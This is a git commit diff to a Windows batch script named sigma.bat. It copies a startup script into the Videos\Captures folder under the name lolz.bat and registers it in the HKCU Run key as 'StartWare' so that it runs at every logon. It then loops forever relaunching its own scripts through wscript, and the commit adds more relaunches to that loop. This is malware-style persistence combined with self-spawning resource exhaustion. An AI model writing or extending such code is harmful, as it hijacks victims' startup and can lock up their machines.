d864f06fb0caa33cf328f446cced8164b92b44fd
AXL.Alixx <58485851+axlalixx@users.noreply.github.com>
2024-12-20 01:57:19 +0000

    Update sigma.bat

--- sigma.bat
+++ sigma.bat
@@ -3,6 +3,9 @@ copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\Videos\Captures\lolz.bat
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "StartWare" /t REG_SZ /d "%USERPROFILE%\Videos\Captures\lolz.bat" /f
 
 :loop
+wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\filel.bat
 wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\file.bat
+wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\sigma.bat
 wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\copy.bat
+wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\startup.bat
 goto loop
